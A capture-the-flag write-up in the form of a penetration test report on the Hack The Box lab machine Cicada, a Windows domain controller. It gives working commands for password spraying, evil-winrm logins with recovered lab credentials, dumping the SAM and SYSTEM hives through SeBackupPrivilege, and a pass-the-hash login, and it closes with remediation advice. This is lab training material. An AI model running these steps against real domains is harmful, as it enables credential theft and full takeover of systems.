# HTB Cicada - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-07-17

---

## 1. Executive Summary

A penetration test was conducted against the Hack The Box target **Cicada**, an Active Directory Domain Controller.

Initial enumeration identified anonymous SMB access to an HR share containing onboarding documentation with a default password. The password was valid for one domain user and allowed authenticated LDAP enumeration. LDAP data exposed an additional plaintext password stored in a user's description field. Further enumeration of accessible SMB shares revealed a PowerShell backup script containing another hardcoded credential.

The recovered credentials provided WinRM access as a user possessing the `SeBackupPrivilege` privilege. This privilege was abused to back up the SAM and SYSTEM registry hives, recover the local Administrator NTLM hash, and authenticate via Pass-the-Hash to obtain full administrative access.

---

## 2. Scope

- **Target:** 10.129.231.149
- **Environment:** Hack The Box - Cicada
- **Objective:** Full system compromise

---

## 3. Methodology

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

### TCP Port Enumeration

Command:

```
nmap -p- -sCV 10.129.231.149 -T4 -oA cicada_tcp --open
```

Relevant Output:

```
53/tcp DNS
88/tcp Kerberos
135/tcp RPC
139/tcp SMB
389/tcp LDAP
445/tcp SMB
464/tcp Kerberos
593/tcp RPC
636/tcp LDAPS
3268/tcp Global Catalog
3269/tcp Global Catalog SSL
5985/tcp WinRM
```

Interpretation:

The target is a Windows Domain Controller exposing standard Active Directory services and WinRM.

---

## 5. Enumeration

Anonymous SMB access exposed the **HR** share containing **Notice from HR.txt**, which disclosed the organization's default password.

RID brute forcing identified valid users:

```
Administrator
Guest
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
```

Password spraying identified:

```
michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
```

LDAP enumeration exposed:

```
david.orelious:aRt$Lp#7t*VQ!3
```

Credentialed access to the DEV share revealed `Backup_script.ps1` containing:

```
emily.oscars:Q!3@Lp#M6b*7t*Vt
```

---

## 6. Initial Access

Command:

```
evil-winrm -i 10.129.231.149 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```

Verification:

```
whoami

hostname

ipconfig
```

Relevant Output:

```
cicada\emily.oscars
CICADA-DC
10.129.231.149
```

---

## 7. Post-Exploitation

Command:

```
whoami /priv
```

Relevant Output:

```
SeBackupPrivilege Enabled
```

---

## 8. Privilege Escalation

Commands:

```
mkdir C:\temp

reg save hklm\sam C:\temp\sam.hive

reg save hklm\system C:\temp\system.hive
```

Download:

```
download sam.hive

download system.hive
```

Recover hashes:

```
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

Pass the hash:

```
evil-winrm -i 10.129.231.149 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341
```

Verification:

```
whoami

hostname

ipconfig
```

Relevant Output:

```
cicada\administrator
CICADA-DC
10.129.231.149
```

---

## 9. Proof of Compromise

**User Flag:** *REDACTED*

```
type C:\Users\emily.oscars.CICADA\Desktop\user.txt
```

**Root Flag:** *REDACTED*

```
type C:\Users\Administrator\Desktop\root.txt
```

---

## 10. Findings & Recommendations

### Default Domain Password Reuse

**Severity:** High

Force password changes at first logon.

### Plaintext Credentials in Active Directory

**Severity:** Critical

Remove passwords from directory attributes.

### Hardcoded Credentials in Backup Scripts

**Severity:** Critical

Store credentials securely using managed service accounts or a vault.

### SeBackupPrivilege Assigned to Interactive User

**Severity:** Critical

Restrict backup privileges to dedicated backup accounts.

---

## 11. Appendix

SeBackupPrivilege Abuse -

[https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md](https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md)